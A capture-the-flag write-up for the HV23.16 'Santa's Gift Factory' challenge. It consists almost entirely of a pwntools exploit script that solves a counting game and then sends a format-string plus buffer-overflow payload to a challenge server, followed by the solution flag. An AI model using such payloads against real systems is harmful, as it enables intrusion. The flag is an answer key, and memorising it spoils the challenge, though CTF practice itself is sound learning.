# [HV23.16] Santa's Gift Factory

## Introduction

Difficulty: Hard<br>
Author: Fabi_07

Did you know that Santa has its own factory for making gifts? Maybe you can exploit it to get your own special gift!

## Solution

I've deleted all my writeups on accident on Day 20 and I will not go through this challenge a second time, I am sorry. (Not really, I hated this challenge)

```py
from pwn import *

rem = remote('152.96.15.5', 1337)
rem.recvuntil(b"? \x1b[?25h")
rem.sendline(b"y")
rem.recvuntil(b"\n\n")
presents = rem.recvuntil(b"\n\n")

red = presents.count(b"red")
yellow = presents.count(b"yellow")
blue = presents.count(b"blue")

rem.recvuntil(b"\n > ")
rem.sendline(f"{red}".encode())
rem.recvuntil(b"\n > ")
rem.sendline(f"{yellow}".encode())
rem.recvuntil(b"\n > ")
rem.sendline(f"{blue}".encode())
rem.recvuntil(b"name?\n > \x1b[?25h")
rem.sendline(b"A")
rem.recvuntil(b"else?\n > \x1b[?25h")
rem.sendline(b"%25$s" + b"A"*131 + b"\x84")

print(rem.recvall())
```

Flag: `HV23{roses_are_red_violets_are_blue_the_bufferoverfl0w_is_0n_line_32}`